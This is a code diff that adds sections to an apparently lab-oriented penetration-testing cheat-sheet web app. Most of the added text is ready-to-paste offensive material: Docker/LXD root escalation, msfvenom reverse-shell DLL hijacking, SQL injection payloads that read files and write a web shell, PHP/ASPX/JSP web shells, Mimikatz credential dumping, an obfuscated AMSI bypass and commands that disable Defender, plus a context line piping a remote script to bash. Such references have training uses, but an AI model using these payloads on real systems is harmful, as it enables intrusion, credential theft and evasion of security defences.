@@ -247,6 +247,10 @@ curl http://${ip||"LHOST"}/lse.sh | bash`, q: "Run automated enumeration FIRST",
     { id: "pass", label: "Password Hunt", cmd: () => `grep -rli 'password\\|passwd\\|secret\\|credential' /etc/ /opt/ /var/ /home/ /tmp/ /srv/ 2>/dev/null\nfind / \\( -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*.cfg' -o -name '*.db' -o -name '*.sqlite*' -o -name '.env' -o -name 'wp-config*' -o -name 'config.php' \\) 2>/dev/null | head -40\ncat /home/*/.bash_history /root/.bash_history 2>/dev/null\nls -la /home/*/.ssh/ 2>/dev/null`, q: "Found credentials?", critical: true,
       yes: "Try su, SSH, or reuse on other services/machines",
       no: "Continue to network" },
+    { id: "docker", label: "Docker / LXD Group", cmd: () => `id\ngroups\nls -la /var/run/docker.sock 2>/dev/null\nwhich docker 2>/dev/null`, q: "User in docker/lxd group?", critical: true,
+      yes: "INSTANT ROOT — mount host filesystem!",
+      yesCmd: () => `# ─── DOCKER GROUP ───\ndocker run -v /:/mnt --rm -it alpine chroot /mnt bash\n# You are now root on the host!\n\n# Or just read files:\ndocker run -v /:/mnt --rm alpine cat /mnt/etc/shadow\ndocker run -v /:/mnt --rm alpine cat /mnt/root/proof.txt\n\n# ─── LXD GROUP ───\n# 1. On attacker — build alpine image:\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder && sudo bash build-alpine\n# Transfer .tar.gz to target\n\n# 2. On target:\nlxc image import alpine.tar.gz --alias myimage\nlxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n# Host root FS at /mnt/root/`,
+      no: "Continue to internal services" },
     { id: "net", label: "Internal Services", cmd: () => `ss -tlnp\nip a && ip route\narp -a\ncat /etc/hosts`, q: "Services on 127.0.0.1 only?",
       yes: "Port forward and attack internal services",
       yesCmd: (ip) => `# SSH forward:\nssh -L 8080:127.0.0.1:8080 user@${ip||"TARGET"}\n# Chisel:\n# Attacker: ./chisel server --reverse -p 8000\n# Target: ./chisel client ${ip||"LHOST"}:8000 R:8080:127.0.0.1:8080`,
@@ -277,6 +281,10 @@ C:\\Temp\\SharpUp.exe audit`, q: "Run automated enumeration FIRST", critical: tr
     { id: "svc", label: "Service Misconfigs", cmd: () => `# Unquoted paths:\nwmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"\n\n# Weak permissions:\nicacls "C:\\path\\to\\service.exe"\n\n# PowerUp:\npowershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"`, q: "Writable service? Unquoted path?", critical: true,
       yes: "Replace binary or abuse unquoted path",
       yesCmd: () => `# Writable service binary:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f exe -o evil.exe\ncopy evil.exe "C:\\path\\to\\service.exe"\nsc stop VulnService && sc start VulnService\n\n# Unquoted path "C:\\Program Files\\Vuln App\\service.exe":\ncopy evil.exe "C:\\Program Files\\Vuln.exe"`,
+      no: "Continue to DLL hijacking" },
+    { id: "dll", label: "DLL Hijacking", cmd: () => `# Find missing DLLs (Process Monitor or manual):\n# 1. Check service/app binary with PowerUp:\npowershell -ep bypass -c ". .\\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack"\n\n# 2. Manual — check writable PATH dirs:\necho %PATH%\nicacls "C:\\Path\\Dir"   # Look for (M) or (F) for your user\n\n# 3. Check what DLLs a service loads:\n# Use: procmon.exe with filter: Result=NAME NOT FOUND, Path ends .dll`, q: "Missing DLL in writable path?", critical: true,
+      yes: "Drop malicious DLL → restart service = SYSTEM!",
+      yesCmd: () => `# Generate malicious DLL:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f dll -o hijack.dll\n\n# Copy to writable PATH dir with the expected DLL name:\ncopy hijack.dll "C:\\Writable\\Path\\missing.dll"\n\n# Restart the service:\nsc stop VulnService && sc start VulnService\n# Or reboot if needed: shutdown /r /t 0`,
       no: "Continue to scheduled tasks" },
     { id: "tasks", label: "Scheduled Tasks", cmd: () => `schtasks /query /fo LIST /v\n# Check writable task scripts:\nicacls "C:\\path\\to\\script.bat"`, q: "Writable task scripts?",
       yes: "Inject reverse shell into the task script",
@@ -716,6 +724,214 @@ done
 
 # ─── JOHN RULES ───
 john --wordlist=wordlist.txt --rules=best64 hash.txt`}</div></div>
+    <div className="sec-title">Exploit Search & Compilation</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── SEARCHSPLOIT WORKFLOW ───
+searchsploit 'Apache 2.4.49'
+searchsploit 'vsftpd 2.3'
+searchsploit -t 'service name'       # Title only search
+searchsploit -e 'service name'       # Exact match
+
+# Mirror exploit to current dir:
+searchsploit -m 12345                # By exploit-db ID
+searchsploit -m linux/remote/12345.py
+
+# ─── MODIFY EXPLOIT ───
+# ALWAYS check these before running:
+# 1. Change LHOST/LPORT/RHOST to your values
+# 2. Check if it needs a different python version (python2 vs python3)
+# 3. Check if it drops a webshell (change path if needed)
+
+# ─── CROSS-COMPILE FOR TARGET ───
+# Linux target (on Kali):
+gcc exploit.c -o exploit              # 64-bit
+gcc -m32 exploit.c -o exploit         # 32-bit
+gcc exploit.c -o exploit -static      # Static (no deps)
+
+# Windows target (on Kali):
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe      # 64-bit
+i686-w64-mingw32-gcc exploit.c -o exploit.exe         # 32-bit
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32  # With winsock
+
+# ─── COMMON FIXES ───
+# Python2 exploit on Python3:
+2to3 -w exploit.py
+
+# Missing python module:
+pip install requests pycryptodome impacket
+
+# Compile error missing headers:
+apt install gcc-multilib`}</div></div>
+    <div className="sec-title">Manual SQL Injection</div>
+    <div className="gen-out"><div className="cmd">{`# ─── DETECTION ───
+# Test these in EVERY parameter (URL, POST, cookies, headers):
+'                        # Error = SQLi likely
+' OR '1'='1             # Auth bypass
+' OR '1'='1'-- -        # Auth bypass (comment rest)
+" OR "1"="1"-- -        # Double quotes variant
+' UNION SELECT null-- -  # Test UNION columns
+
+# ─── UNION-BASED (Data Extraction) ───
+# 1. Find number of columns:
+' ORDER BY 1-- -    # OK
+' ORDER BY 2-- -    # OK
+' ORDER BY 3-- -    # ERROR → 2 columns
+
+# 2. Find visible columns:
+' UNION SELECT 'a','b'-- -
+
+# 3. Extract data:
+' UNION SELECT username,password FROM users-- -
+' UNION SELECT table_name,null FROM information_schema.tables-- -
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -
+
+# ─── BLIND BOOLEAN (True/False response diff) ───
+' AND 1=1-- -    # True (normal page)
+' AND 1=2-- -    # False (different page)
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
+
+# ─── BLIND TIME-BASED ───
+' AND SLEEP(5)-- -                               # MySQL
+'; WAITFOR DELAY '0:0:5'-- -                     # MSSQL
+' AND pg_sleep(5)-- -                             # PostgreSQL
+
+# ─── ERROR-BASED ───
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -    # MySQL
+' AND 1=CONVERT(int,(SELECT @@version))-- -                   # MSSQL
+
+# ─── FILE READ / WRITE (MySQL) ───
+' UNION SELECT LOAD_FILE('/etc/passwd'),null-- -
+' UNION SELECT '<?php system($_GET["c"]); ?>',null INTO OUTFILE '/var/www/html/shell.php'-- -
+
+# ─── AUTH BYPASS CHEATSHEET ───
+admin' OR '1'='1'-- -
+admin'/*
+' OR 1=1#
+' OR 1=1-- -
+') OR ('1'='1
+admin' AND '1'='1`}</div></div>
+    <div className="sec-title">Cracking Found Files</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ─── SSH PRIVATE KEY (encrypted id_rsa) ───
+ssh2john id_rsa > id_rsa.hash
+john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# OR: hashcat -m 22931 id_rsa.hash rockyou.txt
+
+# ─── KEEPASS DATABASE (.kdbx) ───
+keepass2john Database.kdbx > keepass.hash
+john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# OR: hashcat -m 13400 keepass.hash rockyou.txt
+
+# ─── ZIP FILE ───
+zip2john backup.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# OR: hashcat -m 17200 zip.hash rockyou.txt (PKZIP)
+# OR: hashcat -m 13600 zip.hash rockyou.txt (WinZip)
+
+# ─── 7z FILE ───
+7z2john archive.7z > 7z.hash
+john 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# ─── RAR FILE ───
+rar2john archive.rar > rar.hash
+john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# ─── PDF FILE ───
+pdf2john protected.pdf > pdf.hash
+john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# ─── /etc/shadow (Linux) ───
+unshadow /etc/passwd /etc/shadow > unshadowed.txt
+john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
+# OR: hashcat -m 1800 shadow.hash rockyou.txt  (SHA-512)
+
+# ─── PFX / PKCS12 CERTIFICATE ───
+pfx2john certificate.pfx > pfx.hash
+john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# ─── GPG KEY ───
+gpg2john private.key > gpg.hash
+john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt`}</div></div>
+    <div className="sec-title">Post-Exploitation Credential Harvesting</div>
+    <div className="gen-out"><div className="cmd">{`# ═══ WINDOWS ═══
+
+# Mimikatz (run as SYSTEM/Admin):
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords         # Dump all cached creds
+sekurlsa::tickets /export        # Export Kerberos tickets
+lsadump::sam                     # Dump SAM hashes
+lsadump::dcsync /user:Administrator  # DCSync
+
+# DPAPI (saved browser/wifi passwords):
+mimikatz.exe "dpapi::cred /in:C:\\Users\\USER\\AppData\\Local\\Microsoft\\Credentials\\*"
+
+# Saved WiFi passwords:
+netsh wlan show profiles
+netsh wlan show profile name="SSID" key=clear
+
+# Windows Credential Manager:
+cmdkey /list
+rundll32.exe keymgr.dll,KRShowKeyMgr
+
+# PowerShell history:
+type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
+
+# Registry autologon:
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" | findstr /i "DefaultPassword DefaultUserName"
+
+# IIS config:
+type C:\\inetpub\\wwwroot\\web.config
+type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config
+
+# Unattend files:
+dir /s /b C:\\*unattend* C:\\*sysprep* 2>nul
+
+# ═══ LINUX ═══
+
+# Shadow file:
+cat /etc/shadow
+
+# SSH keys:
+find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
+
+# Config files with passwords:
+grep -rli "password\\|passwd\\|secret\\|key\\|token\\|api" /etc/ /opt/ /var/ /home/ /srv/ 2>/dev/null
+cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -i "pass\\|secret\\|key\\|mysql\\|ssh"
+
+# Database creds:
+cat /var/www/html/wp-config.php 2>/dev/null          # WordPress
+cat /var/www/html/.env 2>/dev/null                    # Laravel/generic
+cat /var/www/html/config/database.yml 2>/dev/null     # Rails
+cat /opt/*/config*.php /opt/*/.env 2>/dev/null        # Custom apps
+find / -name "*.conf" -exec grep -li "password" {} \\; 2>/dev/null
+
+# .git repos (may contain old passwords):
+find / -name ".git" -type d 2>/dev/null
+cd /path/to/repo && git log --all --oneline
+git diff HEAD~10`}</div></div>
+    <div className="sec-title">Web Shells (One-liners)</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── PHP ───
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+
+# Usage: curl "http://TARGET/shell.php?cmd=whoami"
+
+# PHP with file upload bypass (GIF header):
+GIF89a<?php system($_GET['cmd']); ?>
+
+# ─── ASPX ───
+<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
+<%= Process.Start(new ProcessStartInfo("cmd","/c "+Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd() %>
+
+# ─── JSP ───
+<% Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c",request.getParameter("cmd")}; Process p = rt.exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()); out.println(s.hasNext() ? s.next() : ""); %>
+
+# ─── AMSI BYPASS (PowerShell — run before loading tools) ───
+[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65)+'msi'+$([char]85)+'tils').GetField('amsi'+$([char]73)+'nit'+$([char]70)+'ailed','NonPublic,Static').SetValue($null,$true)
+
+# ─── WINDOWS DEFENDER EXCLUSION (if admin) ───
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\\Temp"`}</div></div>
   </div>)
 }
 
